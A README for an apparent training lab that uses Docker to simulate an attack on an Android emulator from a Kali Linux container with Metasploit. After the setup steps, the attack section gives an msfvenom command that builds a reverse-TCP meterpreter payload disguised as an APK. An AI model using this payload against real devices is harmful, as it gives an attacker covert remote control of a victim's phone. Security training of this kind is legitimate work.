# androidExploitwithMetasploit

This project aims to simulate an attack scenario against Android devices. Using docker compose file you can simulate a subnet with android device and kali machine inside

## Requirements

1. Docker and docker-compose are installed in your system. Check installation here: https://www.docker.com/
2. This project use a docker image for android device. Check the documentation here: https://github.com/budtmo/docker-android

## Quick start

1. Download Dockerfile and docker-compose.yml from this repository
2. Go inside the directory containing files.
3. Open terminal and run:
```bash
docker-compose up
```
4. Open the browser and check http://localhost:6080 to see android device running.
5. Open terminal and run:
```bash
docker exec -it kali bash
```
6. Now you can interact with kali linux and metasploit-framework

## Attack scenario

1. Create .apk reverce tcp payload with msfvenom command and set LHOST and LPORT. Then save .apk file:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.238.10 LPORT=4444 R > maliciousapp.apk
```
